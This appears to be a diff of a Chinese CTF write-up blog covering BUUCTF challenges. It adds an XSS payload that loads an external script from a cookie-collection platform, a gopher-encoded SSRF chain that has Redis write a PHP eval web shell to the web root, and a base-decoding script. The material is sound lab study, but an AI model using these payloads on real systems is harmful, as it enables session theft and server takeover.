@@ -25,6 +25,9 @@ tags:
 3. [dirsearch](https://github.com/maurosoria/dirsearch) 扫描工具
 4. [PHPStorm](https://www.jetbrains.com/phpstorm/) PHP的IDE
 5. [AntSword](https://github.com/AntSwordProject/antSword) [AntSword-Loader](https://github.com/AntSwordProject/AntSword-Loader)
+6. [Gopherus](https://github.com/tarunkant/Gopherus) [Gopherus3](https://github.com/Esonhugh/Gopherus3) Gopher协议
+
+
 # 1 Web
 ## HTTP
 ### [HTTP](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Http)
@@ -335,5 +338,111 @@ print(result)
 ```
 
 ### [XSS](https://buuoj.cn/challenges#BUU%20XSS%20COURSE%201)
+2025年7月访问[内网xss](http://xss.buuoj.cn)已停止服务。。。
+
+书中命令
+```sh
+<img src="tmp.png" onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22http%3A%2F%2Fxss.buuoj.cn%2FZFnLJY%22%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));>
+```
+```Java
+var b = document.createElement("sCript");  // 创建一个 script 元素
+b.src = "http://xss.buuoj.cn/ZFnLJY";     // 设置外部脚本地址
+// 将 script 插入到 <head> 或 <body> 中
+(document.getElementsByTagName("HEAD")[0] || document.body).appendChild(b);
+```
+
+选择平台[xssjs](https://xssjs.com/login/)，创建项目，选择默认模块，选择复制代码
+```sh
+<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='//ujs.ci/yyo';>
+```
+但是平台并没有收到期望信息。。。
+
+### [SSFR](https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E7%8E%84%E6%AD%A6%E7%BB%84]SSRFMe)
+
+```sh
+http://17cf1dbf-a570-4fc2-b02b-f88141cc740d.node5.buuoj.cn:81/?url=http://127.0.0.1
+
+http://127.0.0.1 is inner ip
+```
+
+```sh
+http://17cf1dbf-a570-4fc2-b02b-f88141cc740d.node5.buuoj.cn:81/?url=http://0.0.0.0/hint.php
+```
+
+```sh
+http://17cf1dbf-a570-4fc2-b02b-f88141cc740d.node5.buuoj.cn:81/?url=dict://0.0.0.0:6379/
+
+string(39) "-NOAUTH Authentication required. +OK "
+```
+原始Redis
+```sh
+auth root 
+config set dir /var/www/html/ 
+config set dbfilename shell.php
+set x <?php phpinfo(); ?>
+save
+```
+一次URL编码成Gopher
+```sh
+gopher://127.0.0.1:6379/_auth%20root%0D%0Aconfig%20set%20dir%20/var/www/html/%0D%0Aconfig%20set%20dbfilename%20shell.php%0D%0Aset%20x%20%22%3C%3Fphp%20phpinfo%28%29%3B%20%3F%3E%22%0D%0Asave%0D%0A
+```
+二次URL编码
+```sh
+gopher%3A%2F%2F127.0.0.1%3A6379%2F_auth%2520root%250D%250Aconfig%2520set%2520dir%2520%2Fvar%2Fwww%2Fhtml%2F%250D%250Aconfig%2520set%2520dbfilename%2520shell.php%250D%250Aset%2520x%2520%2522%253C%253Fphp%2520phpinfo%2528%2529%253B%2520%253F%253E%2522%250D%250Asave%250D%250A
+```
+访问shell.php发现有用。修改成一句话马。
+```
+auth root 
+config set dir /var/www/html/ 
+config set dbfilename shell.php
+set x <?php @eval($_POST['cmd']);?>
+save
+```
+```sh
+gopher://127.0.0.1:6379/_auth%20root%0D%0Aconfig%20set%20dir%20/var/www/html/%0D%0Aconfig%20set%20dbfilename%20shell.php%0D%0Aset%20x%20%22%3C%3Fphp%20%40eval%28%24_POST%5B%27cmd%27%5D%29%3B%3F%3E%22%0D%0Asave%0D%0A
+
+gopher%3A%2F%2F127.0.0.1%3A6379%2F_auth%2520root%250D%250Aconfig%2520set%2520dir%2520%2Fvar%2Fwww%2Fhtml%2F%250D%250Aconfig%2520set%2520dbfilename%2520shell.php%250D%250Aset%2520x%2520%2522%253C%253Fphp%2520%2540eval%2528%2524_POST%255B%2527cmd%2527%255D%2529%253B%253F%253E%2522%250D%250Asave%250D%250A
+```
+
+AntSword连接找到/flag即可。
+
+[redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server)  
+[redis-ssrf](https://github.com/xmsec/redis-ssrf)
+
+# 2 Crypto
+### [BASE](https://buuoj.cn/challenges#[AFCTF2018]BASE)
+
+```py
+import base64
+import re
+
+base16_dic = r'^[A-F0-9]*$'
+base32_dic = r'^[A-Z2-7=]*$'
+base64_dic = r'^[A-Za-z0-9/+=]*$'
+n = 0
+s = open('flag_encode.txt', 'rb').read()
+while True:
+    n += 1
+    code = f"n = {n},"
+    t = s.decode()
+    if '{' in t:
+        print(t)
+        break
+    elif re.match(base16_dic, t):
+        s = base64.b16decode(s)
+        codestr = code + "base16"
+    elif re.match(base32_dic, t):
+        s = base64.b32decode(s)
+        codestr = code + "base32"
+    elif re.match(base64_dic, t):
+        s = base64.b64decode(s)
+        codestr = code + "base64"
+    else:
+        print('......')
+    print(codestr)               
+```
+
+### [Cipher](https://buuoj.cn/challenges#[AFCTF2018]Single)
+c++11起使用std::shuffle替代std::random_shuffle
 
 
